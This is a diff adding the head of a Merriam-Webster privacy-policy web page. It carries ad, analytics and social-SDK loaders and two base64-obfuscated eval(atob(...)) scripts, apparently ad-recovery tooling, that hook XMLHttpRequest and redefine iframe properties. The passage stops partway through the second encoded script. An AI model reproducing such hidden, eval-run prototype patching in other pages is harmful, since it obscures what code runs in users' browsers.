@@ -1,0 +1,965 @@
+<!DOCTYPE html>
+<!--[if lt IE 8]><html lang="en"><![endif]--><!--[if IE 8]> <html class="lt-ie10 lt-ie9 ie8"> <![endif]--><!--[if IE 9]> <html class="lt-ie10 ie9"> <![endif]--><!--[if (gt IE 9)|!(IE)]> <!--> <html lang="en"> <!--<![endif]-->
+  <head>
+  <meta charset="utf-8">
+    
+              <script>/* observer-7.2.0 */ eval(atob("IWZ1bmN0aW9uIHQoZSxuLG8pe2Z1bmN0aW9uIHIoYSxzKXtpZighblthXSl7aWYoIWVbYV0pe3ZhciB1PSJmdW5jdGlvbiI9PXR5cGVvZiByZXF1aXJlJiZyZXF1aXJlO2lmKCFzJiZ1KXJldHVybiB1KGEsITApO2lmKGkpcmV0dXJuIGkoYSwhMCk7dmFyIGQ9bmV3IEVycm9yKCJDYW5ub3QgZmluZCBtb2R1bGUgJyIrYSsiJyIpO3Rocm93IGQuY29kZT0iTU9EVUxFX05PVF9GT1VORCIsZH12YXIgYz1uW2FdPXtleHBvcnRzOnt9fTtlW2FdWzBdLmNhbGwoYy5leHBvcnRzLGZ1bmN0aW9uKHQpe3ZhciBuPWVbYV1bMV1bdF07cmV0dXJuIHIobj9uOnQpfSxjLGMuZXhwb3J0cyx0LGUsbixvKX1yZXR1cm4gblthXS5leHBvcnRzfWZvcih2YXIgaT0iZnVuY3Rpb24iPT10eXBlb2YgcmVxdWlyZSYmcmVxdWlyZSxhPTA7YTxvLmxlbmd0aDthKyspcihvW2FdKTtyZXR1cm4gcn0oezE6W2Z1bmN0aW9uKHQsZSxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gbyh0KXt2YXIgZT1hcmd1bWVudHMubGVuZ3RoPjEmJnZvaWQgMCE9PWFyZ3VtZW50c1sxXT9hcmd1bWVudHNbMV06Ik5FV19TQ1JJUFRfRVZFTlQiLG49YXJndW1lbnRzLmxlbmd0aD4yJiZ2b2lkIDAhPT1hcmd1bWVudHNbMl0/YXJndW1lbnRzWzJdOnt9LG89bmV3IHIoZSx7ZGV0YWlsOm59KTt0LmRpc3BhdGNoRXZlbnQobyl9dmFyIHI9dCgzKTtlLmV4cG9ydHM9b30sezM6M31dLDI6W2Z1bmN0aW9uKHQsZSxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gbyh0KXt0LmFkb25pcz10LmFkb25pc3x8e30sdC5hZG9uaXMuc2NyaXB0U3RhdHVzZXM9e30sdC5hZG9uaXMucmVxdWVzdFN0YXR1c2VzPXt9O3ZhciBlPXQuWE1MSHR0cFJlcXVlc3QucHJvdG90eXBlLm9wZW47dC5YTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUub3Blbj1mdW5jdGlvbihuLG8pe3RoaXMuYWRkRXZlbnRMaXN0ZW5lcigiZXJyb3IiLGZ1bmN0aW9uKGUpezA9PT10aGlzLnN0YXR1cz90LmFkb25pcy5zY3JpcHRTdGF0dXNlc1tvXT0iZXJyb3IiOnQuYWRvbmlzLnNjcmlwdFN0YXR1c2VzW29dPSJsb2FkIn0pLHRoaXMuYWRkRXZlbnRMaXN0ZW5lcigibG9hZCIsZnVuY3Rpb24oZSl7dC5hZG9uaXMuc2NyaXB0U3RhdHVzZXNbb109ImxvYWQifSksdGhpcy5hZGRFdmVudExpc3RlbmVyKCJsb2FkZW5kIixmdW5jdGlvbihlKXt0LmFkb25pcy5yZXF1ZXN0U3RhdHVzZXNbb109dGhpcy5zdGF0dXMscih0KX0pO3ZhciBpPVtdLnNsaWNlLmNhbGwoYXJndW1lbnRzLDApO3JldHVybiBlLmFwcGx5KHRoaXMsaSl9fXZhciByPXQoMSk7ZS5leHBvcnRzPXt3cmFwWE1MSHR0cFJlcXVlc3Q6b319LHsxOjF9XSwzOltmdW5jdGlvbih0LGUsbil7KGZ1bmN0aW9uKHQpe2Z1bmN0aW9uIG4oKXt0cnl7dmFyIHQ9bmV3IG8oImNhdCIse2RldGFpbDp7Zm9vOiJiYXIifX0pO3JldHVybiJjYXQiPT09dC50eXBlJiYiYmFyIj09PXQuZGV0YWlsLmZvb31jYXRjaChlKXt9cmV0dXJuITF9dmFyIG89dC5DdXN0b21FdmVudDtlLmV4cG9ydHM9bigpP286InVuZGVmaW5lZCIhPXR5cGVvZiBkb2N1bWVudCYmImZ1bmN0aW9uIj09dHlwZW9mIGRvY3VtZW50LmNyZWF0ZUV2ZW50P2Z1bmN0aW9uKHQsZSl7dmFyIG49ZG9jdW1lbnQuY3JlYXRlRXZlbnQoIkN1c3RvbUV2ZW50Iik7cmV0dXJuIGU/bi5pbml0Q3VzdG9tRXZlbnQodCxlLmJ1YmJsZXMsZS5jYW5jZWxhYmxlLGUuZGV0YWlsKTpuLmluaXRDdXN0b21FdmVudCh0LCExLCExLHZvaWQgMCksbn06ZnVuY3Rpb24odCxlKXt2YXIgbj1kb2N1bWVudC5jcmVhdGVFdmVudE9iamVjdCgpO3JldHVybiBuLnR5cGU9dCxlPyhuLmJ1YmJsZXM9Qm9vbGVhbihlLmJ1YmJsZXMpLG4uY2FuY2VsYWJsZT1Cb29sZWFuKGUuY2FuY2VsYWJsZSksbi5kZXRhaWw9ZS5kZXRhaWwpOihuLmJ1YmJsZXM9ITEsbi5jYW5jZWxhYmxlPSExLG4uZGV0YWlsPXZvaWQgMCksbn19KS5jYWxsKHRoaXMsInVuZGVmaW5lZCIhPXR5cGVvZiBnbG9iYWw/Z2xvYmFsOiJ1bmRlZmluZWQiIT10eXBlb2Ygc2VsZj9zZWxmOiJ1bmRlZmluZWQiIT10eXBlb2Ygd2luZG93P3dpbmRvdzp7fSl9LHt9XSw0OltmdW5jdGlvbih0LGUsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIG8odCxlLG4sbyl7ImFkZEV2ZW50TGlzdGVuZXIiaW4gdD90LmFkZEV2ZW50TGlzdGVuZXIoZSxuLG8pOiJhdHRhY2hFdmVudCJpbiB0JiZ0LmF0dGFjaEV2ZW50KCJvbiIrZSxuKX12YXIgcj10KDIpLGk9dCgxKTshZnVuY3Rpb24oKXt3aW5kb3cuYWRvbmlzPXdpbmRvdy5hZG9uaXN8fHt9LHdpbmRvdy5hZG9uaXMuc2NyaXB0U3RhdHVzZXM9e30sci53cmFwWE1MSHR0cFJlcXVlc3Qod2luZG93KSxvKGRvY3VtZW50LCJsb2FkIixmdW5jdGlvbih0KXt0LnRhcmdldCYmIlNDUklQVCI9PT10LnRhcmdldC5ub2RlTmFtZSYmKHdpbmRvdy5hZG9uaXMuc2NyaXB0U3RhdHVzZXNbdC50YXJnZXQuc3JjXT0ibG9hZCIsaSh3aW5kb3cpKX0sITApLG8oZG9jdW1lbnQsImVycm9yIixmdW5jdGlvbih0KXt0LnRhcmdldCYmIlNDUklQVCI9PT10LnRhcmdldC5ub2RlTmFtZSYmKHdpbmRvdy5hZG9uaXMuc2NyaXB0U3RhdHVzZXNbdC50YXJnZXQuc3JjXT0iZXJyb3IiLGkod2luZG93KSl9LCEwKX0oKX0sezE6MSwyOjJ9XX0se30sWzRdKTs="));</script>        
+
+              <meta http-equiv="x-ua-compatible" content="ie=edge">
+      <meta name="referrer" content="unsafe-url">
+      <meta property="fb:app_id" content="178450008855735">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+      <!-- Check to see if it's a noindex page -->
+                            
+      <!--Basic meta-->
+              <title>Privacy Policy | Merriam-Webster</title>
+                    <meta name="description" content="Merriam-Webster is committed to respecting the privacy of visitors to its Web sites. The guidelines below explain how we protect the privacy of visitors to Merriam-Webster.com and its features.">
+                    <link rel="canonical" href="https://www.merriam-webster.com/privacy-policy" />
+                          
+      <!--Static meta -->
+        
+            <script type="text/javascript">
+        var googletag = googletag || {};
+        googletag.cmd = googletag.cmd || [];
+    
+        window.Adomik = window.Adomik || {};
+        Adomik.randomAdGroup = function() {
+          var rand = Math.random();
+          switch (false) {
+          case !(rand < 0.09): return "ad_ex" + (Math.floor(100 * rand));
+          case !(rand < 0.10): return "ad_bc";
+          default: return "ad_opt";
+          }
+        };
+      </script>
+
+      <script async src="//js-sec.indexww.com/ht/htw-merriam-webster.js" type="text/javascript"></script>
+    
+      <!--Add opensearch link-->
+              <link rel="search" type="application/opensearchdescription+xml" href="/opensearch/dictionary.xml" title="Merriam-Webster Dictionary" />
+      
+      <!-- Google Optimize -->
+      
+      <!--Dynamic meta-->
+                                  <meta property="og:title" content="Merriam-Webster is committed to respecting the privacy of visitors to its Web sites." />
+                                        <meta property="og:image" content="https://assets2.cdn-mw.com/mw/static/social-media-share/mw-logo-245x245@1x.png" />
+                                          <meta property="og:url" content="https://www.merriam-webster.com/privacy-policy" />
+                                        <meta property="og:description" content="Here's how we protect the privacy of visitors to Merriam-Webster.com and its features." />
+                                        <meta property="og:type" content="article" />
+                            
+                                                <meta name="twitter:title" content="Merriam-Webster is committed to respecting the privacy of visitors to its Web sites." />
+                                                                <meta name="twitter:image" content="https://assets2.cdn-mw.com/mw/static/social-media-share/mw-logo-245x245@1x.png" />
+                                                                <meta name="twitter:url" content="https://www.merriam-webster.com/privacy-policy" />
+                                                                <meta name="twitter:description" content="Here's how we protect the privacy of visitors to Merriam-Webster.com and its features." />
+                                                                                  <meta name="twitter:card" content="summary" />
+                                                                <meta name="twitter:site" content="@MerriamWebster" />
+                                            
+        <link rel="shortcut icon" href="/favicon.png" type="image/x-icon">
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+
+                      
+              <link rel="preload"  as="style" onload="this.rel='stylesheet'" href="https://fonts.googleapis.com/css?family=Lato:300,300i,400,700|Open+Sans:300,300i,400,400i,600,600i,700,700i|Playfair+Display:400,700" rel="stylesheet">
+      <link rel="preload" href="https://opensource.keycdn.com/fontawesome/4.7.0/font-awesome.min.css" as="style" onload="this.rel='stylesheet';">
+      <noscript>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300i,400,700|Open+Sans:300,300i,400,400i,600,600i,700,700i|Playfair+Display:400,700" rel="stylesheet">
+        <link rel="stylesheet" href="https://opensource.keycdn.com/fontawesome/4.7.0/font-awesome.min.css">
+      </noscript>
+        
+    
+                <link rel="stylesheet" href="//assets.merriam-webster.com/mw/app-bundles/mw-2018-01-15.12-13-35.000000-app-bundle/css/style.min.css" media="screen">
+        
+    
+              <script async>
+      !function(a){"use strict";var b=function(b,c,d){function e(a){return h.body?a():void setTimeout(function(){e(a)})}function f(){i.addEventListener&&i.removeEventListener("load",f),i.media=d||"all"}var g,h=a.document,i=h.createElement("link");if(c)g=c;else{var j=(h.body||h.getElementsByTagName("head")[0]).childNodes;g=j[j.length-1]}var k=h.styleSheets;i.rel="stylesheet",i.href=b,i.media="only x",e(function(){g.parentNode.insertBefore(i,c?g:g.nextSibling)});var l=function(a){for(var b=i.href,c=k.length;c--;)if(k[c].href===b)return a();setTimeout(function(){l(a)})};return i.addEventListener&&i.addEventListener("load",f),i.onloadcssdefined=l,l(f),i};"undefined"!=typeof exports?exports.loadCSS=b:a.loadCSS=b}("undefined"!=typeof global?global:this);!function(a){if(a.loadCSS){var b=loadCSS.relpreload={};if(b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(b){return!1}},b.poly=function(){for(var b=a.document.getElementsByTagName("link"),c=0;c<b.length;c++){var d=b[c];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d,d.getAttribute("media")),d.rel=null)}},!b.support()){b.poly();var c=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){b.poly(),a.clearInterval(c)}),a.attachEvent&&a.attachEvent("onload",function(){a.clearInterval(c)})}}}(this);
+      </script>
+    
+
+
+    <script type="text/javascript">
+      googletag.cmd.push(function() {
+        if  (typeof window.headertag === 'undefined' || window.headertag.apiReady !== true) {
+          window.headertag = googletag;
+            }
+      });
+    </script>
+
+    <script async="async" src="//www.googletagservices.com/tag/js/gpt.js"></script>
+  
+    <script>
+    /* ----- Begin Step 1 ----- */
+    //Load the APS JavaScript Library
+    !function(a9,a,p,s,t,A,g){if(a[a9])return;function q(c,r){a[a9]._Q.push([c,r])}a[a9]={init:function(){q("i",arguments)},fetchBids:function(){q("f",arguments)},setDisplayBids:function(){},targetingKeys:function(){return[]},_Q:[]};A=p.createElement(s);A.async=!0;A.src=t;g=p.getElementsByTagName(s)[0];g.parentNode.insertBefore(A,g)}("apstag",window,document,"script","//c.amazon-adsystem.com/aax2/apstag.js");
+
+    //Initialize the Library
+      apstag.init( {
+        pubID: '3022',
+        adServer: 'googletag',
+        bidTimeout: 2e3
+      });
+    /* ----- End Step 1 ----- */
+    </script>
+        
+    
+        <script type="text/javascript">
+      window.mwdata = {};
+      window.mwdata.assetsDomain1 = '//assets1.cdn-mw.com';
+      window.mwdata.assetsDomain2 = '//assets2.cdn-mw.com';
+      window.mwdata.assetsDomain3 = '//media2.merriam-webster.com';
+      window.mwdata.pronsDomain   = '//media.merriam-webster.com';
+      window.mwdata.env           = 'production';
+      window.mwdata.jw7key        = 'U4WOTZRVVnSrkUDlXjD6ad101zKp0yGynG822w==';
+      window.mwdata.isHome        = false;
+      window.mwdata.ads           = {"slot-top":{"type":"google_dfp","data":{"slot":"\/15510053\/MW\/GEN","id":"div-gpt-ad-120504305048625096-1","defSizes":[[728,90]],"targeting":[["POS",["TOP"]],["PAGE"],["requestSource","GPT"]],"sizeMappings":[{"screen":[0,0],"ads":[[320,50]]},{"screen":[768,100],"ads":[[728,90]]}]}},"slot-right1":{"type":"google_dfp","data":{"slot":"\/15510053\/MW\/GEN","id":"div-gpt-ad-120504305048625096-2","defSizes":[[300,250]],"targeting":[["POS",["TOP"]],["PAGE"],["requestSource","GPT"]],"sizeMappings":[{"screen":[0,0],"ads":[]},{"screen":[768,260],"ads":[[300,250]]}]}},"slot-right2":{"type":"google_dfp","data":{"slot":"\/15510053\/MW\/GEN","id":"div-gpt-ad-120504305048625096-3","defSizes":[[300,250]],"targeting":[["POS",["BOT2"]],["PAGE"],["requestSource","GPT"]],"sizeMappings":[{"screen":[0,0],"ads":[]},{"screen":[768,260],"ads":[[300,250]]}]}}};
+      window.mwdata.ads2          = [];
+      window.mwdata.fbAppId       = '178450008855735';
+      window.mwdata.fbSdkReady    = false;
+      window.mwdata.fbSdkQueue    = [];
+      window.mwdata.gaSiteId              = 'UA-296234-25';
+      window.mwdata.gaNoTrackOnLoad       = false;
+      window.mwdata.gaSpecialTracking     = null;
+      window.mwdata.gaSpecialTrackingWord = null;
+      window.mwdata.gatReady        = false;
+      window.mwdata.gatQueue        = [];
+      window.mwdata.tagsPrepped     = [];
+      window.mwdata.gTagReady       = false;
+      window.mwdata.dfpSvcUp        = false;
+      window.mwdata.adtestSupport  = false;
+      // window.mwdata.disableTopAd   = false;
+      window.mwdata.disableBidders = false;
+      window.mwdata.adsBlacklist   = [];
+      window.mwdata.adsWhitelist   = null;
+      window.mwdata.adsCarCount    = 0;
+      window.mwdata.adsQuizCount   = 0;
+      window.mwdata.search         = "";
+      window.mwdata.cat            = "";
+      window.mwdata.contentType1   = null;
+      window.mwdata.contentType2   = null;
+      window.mwdata.contentType3   = null;
+      window.mwdata.lotame         = null;
+      window.mwdata.userSearch     = "";
+      window.mwHeapEvents = {};
+          </script>
+        
+    
+    
+        <script>
+
+      // get the browser's current window dimensions 
+      function getWindowDimensions() {
+        var width = window.innerWidth ||
+          document.documentElement.clientWidth ||
+          document.body.clientWidth;
+        var height = window.innerHeight ||
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+        return [width, height];
+      }
+  
+      // given a size mapping like: [[[1000, 600], [[300, 250], [300,600]]],[[0,0], [[300,250]]]]
+      // return the valid size mapping as an array like: [[300,250]] when the screen dimensions
+      // are less than 1000 width and 600 height
+      function parseSizeMappings(sizeMappings) {
+        try{
+          // get current window dimensions
+          var sd = getWindowDimensions();
+  
+          // filter mappings that are valid by confirming that the current screen dimensions
+          // are both greater than or equal to the breakpoint [x, y] minimums specified in the first position in the mapping
+          var validMappings = sizeMappings.filter(function(m) {return  m[0][0] <= sd[0] && m[0][1] <= sd[1]});
+  
+          // return the leftmost mapping's sizes or an empty array
+          return validMappings.length > 0 ? validMappings[0][1] :  [];
+        } catch (e) {
+          console.log('error parsing sizeMappings:');
+          console.log(sizeMappings);
+          console.log(e);
+          // fallback to last size mapping supplied 
+          return sizeMappings[ sizeMappings.length -1 ][1];
+        }   
+      }
+      
+      function createSizeMapping() {
+        try {
+          var sizeMap, sizeMap2, adData, adData2;
+          for (var i in window.mwdata.ads) {
+            adData = window.mwdata.ads[i].data;
+            sizeMap = [];
+            if (typeof(adData.sizeMappings) !== "undefined" && adData.sizeMappings.length > 0) {
+              adData.sizeMappings.reverse().forEach(function(adSize) {
+                sizeMap.push([adSize.screen,adSize.ads]);
+              });
+              window.mwdata.ads[i].data.sizeMap = parseSizeMappings(sizeMap);
+              if (window.mwdata.ads[i].data.sizeMap.length === 0) {
+                  window.mwdata.ads[i].data.sizeMap =  adData.defSizes;
+              }
+            }
+          }
+          if (typeof(window.mwdata.ads2) !== "undefined") {
+            for (var j in window.mwdata.ads2) {
+              adData2 = window.mwdata.ads2[j].data;
+              sizeMap2 = [];
+              if (typeof(adData2.sizeMappings) !== "undefined" && adData2.sizeMappings.length > 0) {
+                adData2.sizeMappings.reverse().forEach(function(adSize) {
+                  sizeMap2.push([adSize.screen,adSize.ads]);
+                });
+                window.mwdata.ads2[j].data.sizeMap = parseSizeMappings(sizeMap2);
+                if (window.mwdata.ads2[j].data.sizeMap.length === 0) {
+                    window.mwdata.ads2[j].data.sizeMap =  adData2.defSizes;
+                }
+              }
+            }
+          }
+
+        } catch (e) {
+          console.log("catch e");
+          for (var i in window.mwdata.ads) {
+            window.mwdata.ads[i].data.sizeMap =  window.mwdata.ads[i].data.sizeMap.defSizes;
+          }
+          for (var i in window.mwdata.ads) {
+            window.mwdata.ads2[i].data.sizeMap =  window.mwdata.ads2[i].data.sizeMap.defSizes;
+          }          
+        }
+      }
+
+      createSizeMapping();
+    </script>
+    
+
+
+        <script>
+      if (window.mwdata.isHome === false) {
+          window.fbAsyncInit = function() {
+              //initializing FB
+              FB.init({
+                appId:   window.mwdata.fbAppId,
+                cookie:  true,    // enable cookies to allow the server to access the session
+                xfbml:   true,    // parse social plugins on this page
+                status:  true,    // get the login status.
+                version: 'v2.5'
+              });
+
+              //ok - now we can mark FB sdk as being ready for direct usage
+              window.mwdata.fbSdkReady = true;
+
+              //JC: at this point we can process any tasks that there
+              //were added prior to FB sdk fully loaded
+              var qLength = window.mwdata.fbSdkQueue.length;
+              for (var i = 0; i < qLength; i++) {
+                  var fn  = window.mwdata.fbSdkQueue[i];
+                  fn();
+              }
+              window.mwdata.fbSdkQueue = [];
+
+              //not sure what this is
+              FB.getLoginStatus(function(response) {
+                  //Update components on the page.
+                  $(document).trigger("facebook:loginStatus", [response]);
+              });
+          };
+
+          (function(d, s, id){
+              var js, fjs = d.getElementsByTagName(s)[0];
+              if (d.getElementById(id)) {return;}
+              js = d.createElement(s); js.id = id;
+              js.src = "//connect.facebook.net/en_US/sdk.js";
+              fjs.parentNode.insertBefore(js, fjs);
+          }(document, 'script', 'facebook-jssdk'));
+      }
+    </script>
+        
+    
+        <script>
+      window.mwRequireCall = [];
+      window.require = function(reqName, reqFunc) {
+        window.mwRequireCall.push({reqName:reqName, reqFunc:reqFunc});
+      };
+    </script>
+
+                
+        
+        
+                
+        
+    <script type="text/javascript">
+      window.heap=window.heap||[],heap.load=function(e,t){window.heap.appid=e,window.heap.config=t=t||{};var r=t.forceSSL||"https:"===document.location.protocol,a=document.createElement("script");a.type="text/javascript",a.async=!0,a.src=(r?"https:":"http:")+"//cdn.heapanalytics.com/js/heap-"+e+".js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(a,n);for(var o=function(e){return function(){heap.push([e].concat(Array.prototype.slice.call(arguments,0)))}},p=["addEventProperties","addUserProperties","clearEventProperties","identify","removeEventProperty","setEventProperties","track","unsetEventProperty"],c=0;c<p.length;c++)heap[p[c]]=o(p[c])};
+      if ((window.mwdata.env === 'production') || (window.mwdata.env === 'staging')) {
+        heap.load("537798487");
+      } else {
+        heap.load("1079576041");
+      }
+      heap.clearEventProperties();
+    </script>
+  </head>
+
+  <body class='no-touch wap-article-page'>
+
+              <script>/* wrapper-7.2.0 */ eval(atob("IWZ1bmN0aW9uIHQobixlLHIpe2Z1bmN0aW9uIG8oYSxjKXtpZighZVthXSl7aWYoIW5bYV0pe3ZhciBzPSJmdW5jdGlvbiI9PXR5cGVvZiByZXF1aXJlJiZyZXF1aXJlO2lmKCFjJiZzKXJldHVybiBzKGEsITApO2lmKGkpcmV0dXJuIGkoYSwhMCk7dmFyIGQ9bmV3IEVycm9yKCJDYW5ub3QgZmluZCBtb2R1bGUgJyIrYSsiJyIpO3Rocm93IGQuY29kZT0iTU9EVUxFX05PVF9GT1VORCIsZH12YXIgdT1lW2FdPXtleHBvcnRzOnt9fTtuW2FdWzBdLmNhbGwodS5leHBvcnRzLGZ1bmN0aW9uKHQpe3ZhciBlPW5bYV1bMV1bdF07cmV0dXJuIG8oZT9lOnQpfSx1LHUuZXhwb3J0cyx0LG4sZSxyKX1yZXR1cm4gZVthXS5leHBvcnRzfWZvcih2YXIgaT0iZnVuY3Rpb24iPT10eXBlb2YgcmVxdWlyZSYmcmVxdWlyZSxhPTA7YTxyLmxlbmd0aDthKyspbyhyW2FdKTtyZXR1cm4gb30oezE6W2Z1bmN0aW9uKHQsbixlKXsidXNlIHN0cmljdCI7IWZ1bmN0aW9uKCl7ZnVuY3Rpb24gbigpe2kmJmNvbnNvbGUubG9nLmFwcGx5KGNvbnNvbGUsYXJndW1lbnRzKX1mdW5jdGlvbiBlKHQsbixyLG8saSxhLGMscyxkLHUsZil7dmFyIGw9ZnVuY3Rpb24oKXt0PT09ITAmJmNvbnNvbGUubG9nLmFwcGx5KGNvbnNvbGUsYXJndW1lbnRzKX0scD1bJzxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4oJyxlLnRvU3RyaW5nKCksIikoIixbdC50b1N0cmluZygpLG4udG9TdHJpbmcoKSxyLnRvU3RyaW5nKCksby50b1N0cmluZygpLGkudG9TdHJpbmcoKSxhLnRvU3RyaW5nKCksYy50b1N0cmluZygpLHMudG9TdHJpbmcoKSxkLnRvU3RyaW5nKCksdS50b1N0cmluZygpLCInIit3aW5kb3cubG9jYXRpb24ub3JpZ2luKyInIl0uam9pbigiLCIpLnRvU3RyaW5nKCksIik8IiwiL3NjcmlwdD4iXS5qb2luKCIiKTtuKCkoSFRNTElGcmFtZUVsZW1lbnQsIm5hbWUiLHIoKSxvKHApKSxuKCkoSFRNTElGcmFtZUVsZW1lbnQsImNvbnRlbnREb2N1bWVudCIsYyhhKHApLGkoKSkscygpKSxuKCkoSFRNTElGcmFtZUVsZW1lbnQsImNvbnRlbnRXaW5kb3ciLGQoYShwKSxpKCkpLHUoKSksd2luZG93LmZhaWxlZF91cmxzPXdpbmRvdy5mYWlsZWRfdXJsc3x8W107dmFyIHc9WyJzY3JpcHQiLCJpbWciXTtkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJsb2FkIixmdW5jdGlvbih0KXtsKCJ3aXRoaW5JZnJhbWUgbG9hZCBldmVudCIsdC50YXJnZXQpLCF0LnRhcmdldHx8IlNDUklQVCIhPT10LnRhcmdldC5ub2RlTmFtZSYmIklNRyIhPT10LnRhcmdldC5ub2RlTmFtZXx8KHQudGFyZ2V0Ll9sb2FkU3RhdGU9ImxvYWQiKX0sITApLGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImVycm9yIixmdW5jdGlvbih0KXtsKCJ3aXRoaW5JZnJhbWUgZXJyb3IgZXZlbnQiLHQudGFyZ2V0KSwhdC50YXJnZXR8fCJTQ1JJUFQiIT09dC50YXJnZXQubm9kZU5hbWUmJiJJTUciIT09dC50YXJnZXQubm9kZU5hbWV8fCh0LnRhcmdldC5fbG9hZFN0YXRlPSJlcnJvciIsd2luZG93LmZhaWxlZF91cmxzPXdpbmRvdy5mYWlsZWRfdXJsc3x8W10sd2luZG93LmZhaWxlZF91cmxzLnB1c2godC50YXJnZXQuc3JjKSl9LCEwKSx3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsZnVuY3Rpb24odCl7aWYodC5vcmlnaW49PT1mKXt2YXIgbj10LmRhdGEuZXZlbnROYW1lO2lmKHZvaWQgMCE9PW4pc3dpdGNoKG4pe2Nhc2UiZnJhbWVMb2FkZWQiOndpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UodC5kYXRhLGYpO2JyZWFrO2Nhc2UiYnViYmxldXAiOndpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UodC5kYXRhLGYpfWlmKHZvaWQgMCE9PXQuZGF0YS5pZnJhbWVJZCl7bCgibWVzc2FnZSByZWNlaXZlZCAiK3QuZGF0YS5pZnJhbWVJZCk7dmFyIGU9dC5kYXRhLHI9ZnVuY3Rpb24odCl7ImxvYWRpbmciIT09ZG9jdW1lbnQucmVhZHlTdGF0ZT90KCk6ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsdCl9LG89ZnVuY3Rpb24gaSh0KXt2YXIgbj17b3JpZ2luSWZyYW1lSWQ6dC5pZnJhbWVJZCxyZWFkeVN0YXRlOmRvY3VtZW50LnJlYWR5U3RhdGUscmVxdWVzdERhdGE6W10sY3NzRGF0YTpbXX0sZT10LnNyY1N1YnN0cmluZ3M7aWYodm9pZCAwIT09ZSlmb3IodmFyIHI9ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCh3LmpvaW4oIiwiKSksbz0wO288ci5sZW5ndGg7bysrKXt2YXIgYT1yW29dO2lmKGEuc3JjKXt2YXIgYz1lLnNvbWUoZnVuY3Rpb24odCl7cmV0dXJuIGEuc3JjLmluZGV4T2YodCkhPT0tMX0pO2lmKGMpe2lmKHZvaWQgMD09PWEuX2xvYWRTdGF0ZSlyZXR1cm4gbCgiV2FpdCBmb3IgZXZlbnQgZnJvbSAiK2Euc3JjKSxhLmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLGZ1bmN0aW9uKCl7aSh0KX0pLHZvaWQgYS5hZGRFdmVudExpc3RlbmVyKCJlcnJvciIsZnVuY3Rpb24oKXtpKHQpfSk7bi5yZXF1ZXN0RGF0YS5wdXNoKHt0eXBlOmEubm9kZU5hbWUsc3JjOmEuc3JjLHN0YXRlOmEuX2xvYWRTdGF0ZX0pfX19dmFyIHM9dC5kaXNwbGF5VHlwZXMsZD10LmNzc0F0dHJpYnV0ZXM7dm9pZCAwIT09cyYmdm9pZCAwIT09ZCYmKHI9ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbChzLmpvaW4oIiwiKSksQXJyYXkucHJvdG90eXBlLmZvckVhY2guY2FsbChyLGZ1bmN0aW9uKHQpe3ZhciBlPXdpbmRvdy5nZXRDb21wdXRlZFN0eWxlKHQpLHI9e307ZC5mb3JFYWNoKGZ1bmN0aW9uKHQpe3JbdF09ZS5nZXRQcm9wZXJ0eVZhbHVlKHQpfSksbi5jc3NEYXRhLnB1c2goe3R5cGU6dC5ub2RlTmFtZSxpZDp0LmlkLCJjbGFzcyI6dC5nZXRBdHRyaWJ1dGUoImNsYXNzIiksY3NzQXR0cmlidXRlczpyfSl9KSksbCgic2VuZCByZXNwb25zZSAiK3QuaWZyYW1lSWQpLG4uZmFpbGVkX3VybHM9d2luZG93LmZhaWxlZF91cmxzLHBhcmVudC5wb3N0TWVzc2FnZShuLGYpfTtyKGZ1bmN0aW9uKCl7byhlKX0pfX19KX12YXIgcj10KDUpO3dpbmRvdy5hZG9uaXNIYXNoPXdpbmRvdy5hZG9uaXNIYXNofHx3aW5kb3cubG9jYXRpb24uaGFzaHx8IiI7dmFyIG89d2luZG93LlJUQ1BlZXJDb25uZWN0aW9ufHx3aW5kb3cubW96UlRDUGVlckNvbm5lY3Rpb258fHdpbmRvdy53ZWJraXRSVENQZWVyQ29ubmVjdGlvbjtpZighbylyZXR1cm4gdm9pZCByLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaWZ3LnJ0Yy5hYnNlbnQiKTtyLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaWZ3LnJ0Yy5leGlzdHMiKTt2YXIgaT13aW5kb3cuYWRvbmlzSGFzaC5pbmRleE9mKCJhZG9uaXMtbG9nZ2luZyIpIT09LTEsYT1mdW5jdGlvbigpe3JldHVybiBmdW5jdGlvbih0LG4sZSxyKXt2YXIgbz1PYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKHQucHJvdG90eXBlLG4pO09iamVjdC5kZWZpbmVQcm9wZXJ0eSh0LnByb3RvdHlwZSxuLHtnZXQ6ZnVuY3Rpb24oKXtyZXR1cm4gZShvLmdldCx0aGlzLGFyZ3VtZW50cyl9LHNldDpmdW5jdGlvbigpe3JldHVybiByKG8uc2V0LHRoaXMsYXJndW1lbnRzKX0sZW51bWVyYWJsZTohMH0pfX0sYz1mdW5jdGlvbigpe3JldHVybiBmdW5jdGlvbih0LG4sZSl7cmV0dXJuIHQuYXBwbHkobixlKX19LHM9ZnVuY3Rpb24odCl7cmV0dXJuIGZ1bmN0aW9uKGUscixvKXt0cnl7dmFyIGk9b1swXTtpZihpLmluZGV4T2YoImh0bWwiKSE9PS0xKXt2YXIgYT1pLnNwbGl0KCI7IiksYz1hWzFdLHM9cGFyc2VJbnQoYykrdC5sZW5ndGg7YVsxXT1zLnRvU3RyaW5nKCksaT1hLmpvaW4oIjsiKSxpPWkucmVwbGFjZSgiPGhlYWQ+IiwiPG